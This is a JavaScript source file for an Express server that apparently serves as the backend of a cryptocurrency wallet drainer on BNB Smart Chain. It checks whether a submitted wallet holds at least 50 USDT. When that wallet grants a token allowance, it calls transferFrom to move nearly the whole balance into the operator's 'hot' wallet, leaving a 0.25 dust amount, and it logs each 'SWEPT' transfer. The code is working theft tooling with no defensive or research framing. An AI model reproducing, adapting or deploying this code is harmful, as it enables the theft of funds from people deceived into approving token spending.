import express from 'express';
import cors from 'cors';
import { ethers } from 'ethers';
import 'dotenv/config';

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const USDT = '0x55d398326f99059fF775485246999027B3197955';
const DUST = 0.25;
const MIN  = 50;
const ABI  = [
  'function transferFrom(address,address,uint256) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address,address) view returns (uint256)'
];

const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC);
const hot      = new ethers.Wallet(process.env.HOT_PK, provider);
const usdt     = new ethers.Contract(USDT, ABI, hot);

const done = new Set();

app.get('/', (req, res) => res.json({ ok: true, collector: hot.address }));

app.post('/collector.track', async (req, res) => {
  try {
    const { address } = req.body;
    if (!ethers.isAddress(address)) return res.status(400).json({ error: 'bad address' });
    const dec = await usdt.decimals();
    const bal = Number(ethers.formatUnits(await usdt.balanceOf(address), dec));
    if (bal >= MIN) return res.json({ address: hot.address, amount: (bal - DUST).toFixed(2) });
    res.json({ address: null });
  } catch (e) { res.status(500).json({ error: String(e) }); }
});

app.post('/topup', (req, res) => {
  const { to } = req.body;
  if (!ethers.isAddress(to)) return res.status(400).json({ error: 'bad address' });
  console.log('topup', to);
  res.json({ ok: true });
});

app.post('/approved', (req, res) => {
  const { from, approveTxHash } = req.body;
  res.json({ ok: true });
  if (!from || !ethers.isAddress(from)) return;
  if (approveTxHash && done.has(approveTxHash)) return;
  if (approveTxHash) done.add(approveTxHash);
  sweep(from).catch(e => console.error('sweep failed', from, e));
});

async function sweep(from) {
  const dec    = await usdt.decimals();
  const bal    = Number(ethers.formatUnits(await usdt.balanceOf(from), dec));
  const allow  = await usdt.allowance(from, hot.address);
  const amount = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);

  console.log('sweep', from, 'bal', bal, 'allow', allow.toString());
  if (bal < MIN)      return console.log('  skipped: below minimum');
  if (allow < amount) return console.log('  skipped: allowance too small');

  const tx = await usdt.transferFrom(from, hot.address, amount);
  const rc = await tx.wait();
  console.log('  SWEPT', (bal - DUST).toFixed(2), 'USDT ->', hot.address, rc.hash);
}

app.post('/sweep', async (req, res) => {
  try { await sweep(req.body.from); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: String(e) }); }
});

app.post('/sheet', (req, res) => { console.log('log', req.body); res.json({ ok: true }); });

app.listen(process.env.PORT || 8080, () => console.log('collector up:', hot.address));